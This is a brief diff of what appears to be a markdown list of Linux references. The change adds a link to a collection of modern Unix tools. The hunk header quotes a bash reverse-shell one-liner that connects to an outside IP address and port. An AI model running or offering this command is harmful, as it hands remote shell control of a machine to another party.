@@ -647,3 +647,4 @@ $ bash -i >& /dev/tcp/180.100.74.29/8182 0>&1
 - [ ] [Linux Commands Cheat Sheet](https://parg.co/Uqu)
 - [ ] https://gist.github.com/alkavan/746547
 - [ ] https://github.com/macrozheng/mall/blob/master/document/reference/linux.md
+- [ ] https://github.com/ibraheemdev/modern-unix
